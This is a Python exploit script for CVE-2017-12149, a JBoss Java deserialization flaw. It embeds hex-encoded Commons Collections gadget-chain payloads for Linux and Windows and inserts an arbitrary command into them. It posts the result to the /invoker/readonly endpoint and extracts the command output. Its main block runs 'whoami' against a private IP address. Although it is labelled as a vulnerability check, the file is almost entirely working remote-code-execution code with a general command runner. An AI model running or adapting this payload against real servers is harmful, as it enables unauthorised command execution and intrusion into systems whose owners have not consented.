#!/usr/bin/env python3

'''
name: CVE-2017-12149漏洞
description: CVE-2017-12149漏洞可执行任意命令
'''

import re
import sys
import binascii
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CVE_2017_12149_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.linux_payload_1 =  "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000" \
                    "7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f" \
                    "6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279" \
                    "8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563" \
                    "743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372" \
                    "002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170" \
                    "2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267" \
                    "2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72" \
                    "6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374" \
                    "696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec" \
                    "287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163" \
                    "68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78" \
                    "707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e" \
                    "732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f" \
                    "72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f" \
                    "72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009" \
                    "69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173" \
                    "734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63" \
                    "6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254" \
                    "72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61" \
                    "76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176" \
                    "612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176" \
                    "612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563" \
                    "743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43" \
                    "6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574" \
                    "2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275" \
                    "71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00" \
                    "18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a" \
                    "fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479" \
                    "71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74" \
                    "6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f74" \
                    "6d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a00" \
                    "0000017671007e00187371007e00137571007e00180000000174000e52756e436865636b" \
                    "436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a617661" \
                    "2e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00" \
                    "18000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171" \
                    "007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e" \
                    "537472696e673badd256e7e91d7b470200007870000000017400"
        self.win_payload_1 =  "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000" \
                    "7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f" \
                    "6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279" \
                    "8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563" \
                    "743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372" \
                    "002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170" \
                    "2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267" \
                    "2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72" \
                    "6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374" \
                    "696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec" \
                    "287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163" \
                    "68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78" \
                    "707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e" \
                    "732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f" \
                    "72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f" \
                    "72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009" \
                    "69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173" \
                    "734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63" \
                    "6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254" \
                    "72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61" \
                    "76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176" \
                    "612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176" \
                    "612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563" \
                    "743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43" \
                    "6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574" \
                    "2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275" \
                    "71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00" \
                    "18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a" \
                    "fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479" \
                    "71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74" \
                    "6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f63" \
                    "3a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e73" \
                    "74616e63657571007e001a000000017671007e00187371007e00137571007e0018000000" \
                    "0174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a" \
                    "00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078" \
                    "707371007e00137571007e0018000000017571007e001a0000000171007e003371007e00" \
                    "1e7571007e001a0000000171007e00207371007e00137571007e00180000000175720013" \
                    "5b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001" \
                    "7400"
        self.payload_2  =  "71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e48617" \
                    "3684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573" \
                    "686f6c6478703f4000000000000077080000001000000000787878"
        self.payload = ''
        self.os_type = "unknown"

    def build_command_hex(self, command):
        command_exec_hex = "".join("{:02x}".format(ord(c)) for c in command)
        command_len = len(command)
        command_len_hex = '{:02x}'.format(command_len)
        command_hex = command_len_hex + command_exec_hex
        return command_hex

    def build_payload(self, target_os, command):
        if self.os_type == "unknown":
            if target_os == "linux":
                payload = binascii.unhexlify(self.linux_payload_1 + self.build_command_hex(command) + self.payload_2 )
            if target_os == "windows":
                payload = binascii.unhexlify(self.win_payload_1 + self.build_command_hex(command) + self.payload_2 )
        if self.os_type == "linux":
            payload = binascii.unhexlify(self.linux_payload_1 + self.build_command_hex(command) + self.payload_2 )
        if self.os_type == "windows":
            payload = binascii.unhexlify(self.win_payload_1 + self.build_command_hex(command) + self.payload_2 )
        return payload

    def do_post(self, payload):
        payload_url = self.url + "/invoker/readonly"
        result = requests.post(payload_url, payload, allow_redirects=False, verify=False)
        result_content = result.content.decode(encoding='utf-8')
        return result_content

    def check_OS(self):
        payload_linux = self.build_payload('linux','whoami')
        payload_win = self.build_payload('windows','whoami')
        linux_re = self.do_post(payload_linux)
        win_re = self.do_post(payload_win)
        if  "[L291919]" in linux_re:
            self.os_type = 'linux'
        if "[W291013]" in win_re:
            self.os_type = 'windows'

    def run_command(self, command_in):
        payload = self.build_payload(self.os_type, command_in)
        result = self.do_post(payload)
        result = re.findall ( '](.*?)RunCheckConfig',result, re.DOTALL)
        if len(result) == 0:
            result.append("command error!\n")
        command_callback = result[0]
        return command_callback

    def run(self):
        try:
            self.check_OS()
            if self.os_type == "unknown":
                print('不存在CVE-2017-12149漏洞！')
                return False
            else:
                print('存在CVE-2017-12149漏洞,os name为:',self.os_type)
                print("存在CVE-2017-12149漏洞，执行whoami命令的结果为:", self.run_command('whoami'))
                return True
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2017_12149 = CVE_2017_12149_BaseVerify('http://192.168.30.242:8082')
    CVE_2017_12149.run()
